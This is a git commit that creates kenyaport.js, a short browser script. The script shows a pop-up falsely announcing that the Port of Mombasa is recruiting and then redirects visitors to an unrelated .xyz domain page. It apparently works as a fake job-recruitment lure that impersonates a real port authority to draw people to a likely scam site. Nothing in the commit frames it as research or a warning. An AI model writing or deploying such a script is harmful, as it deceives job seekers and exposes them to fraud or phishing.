4102db67fe7339ba3970a293bb72f7e5c66ba921
newetijazz8 <newetijazz8@gmail.com>
2025-10-07 07:56:18 +0100

    Create kenyaport.js

---
+++ kenyaport.js
@@ -0,0 +1,5 @@
+var password = 'Port Of Mombasa Recruitment'
+password=prompt('NOTICE: Port Of Mombasa is currently recruiting, press OK to apply for the','Port Of Mombasa Recruitment');
+if (password != 'Port Of Mombasa Recruitment') {
+location.href='https://www.itinpty.xyz/Mombasa-Port-Recruitment';
+}
